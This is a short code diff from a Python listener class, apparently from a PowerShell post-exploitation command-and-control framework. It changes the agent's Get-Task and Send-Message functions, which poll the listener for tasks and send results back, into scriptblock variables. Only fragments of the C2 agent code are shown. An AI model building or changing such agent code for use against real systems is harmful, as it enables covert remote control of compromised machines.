@@ -392,7 +392,7 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    function script:Get-Task {
+                    $script:GetTask = {
                         try {
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
@@ -436,7 +436,7 @@ class Listener:
                 """
 
                 sendMessage = """
-                    function script:Send-Message {
+                    $script:SendMessage = {
                         param($Packets)
 
                         if($Packets) {
